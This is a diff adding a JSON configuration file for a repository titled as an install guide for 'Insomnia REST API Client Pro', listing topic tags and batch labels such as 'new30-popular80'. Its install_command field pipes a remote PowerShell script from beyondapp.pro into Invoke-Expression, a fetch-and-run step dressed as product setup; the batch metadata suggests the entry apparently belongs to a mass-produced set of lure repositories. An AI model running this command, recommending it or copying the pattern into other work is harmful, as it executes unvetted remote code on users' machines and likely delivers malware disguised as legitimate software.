@@ -1,0 +1,25 @@
+{
+  "repo": "Insomnia-REST-API-Client-Pro-Install-Guide",
+  "product": "Insomnia REST API Client Pro Install Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "dev",
+  "topics": [
+    "insomnia-rest-api-client-pro-install-gui",
+    "insomnia",
+    "rest",
+    "api",
+    "client",
+    "pro",
+    "install",
+    "dev",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software"
+  ]
+}
